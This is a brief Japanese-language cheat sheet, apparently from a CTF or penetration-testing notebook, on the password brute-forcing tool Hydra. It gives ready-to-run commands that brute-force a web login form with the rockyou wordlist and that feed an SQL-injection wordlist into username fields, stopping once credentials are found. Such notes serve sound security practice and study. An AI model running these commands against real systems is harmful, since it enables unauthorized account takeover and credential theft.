# hydra
- 力こそパワー!BruteForce!
- ftpとかsshとかにも使える

## usage
`hydra -l admin -P /usr/share/wordlists/rockyou.txt <ip> http-form-post "/path/to/form:Username=^USER^&Password=^PASS^(request body):Login failed(error message)"`

## その他テクニック
`hydra -L SQL.txt -p pass 10.10.192.4 http-post-form “/index.php:username=^USER^&password=^PASS^&x=30&y=:Incorrect Login” -f`
- [SQL.txt](https://github.com/xmendez/wfuzz/blob/master/wordlist/Injections/SQL.txt) を使うとSQLiのチェックもできる
- -fでcredentialが見つかったら処理を止める
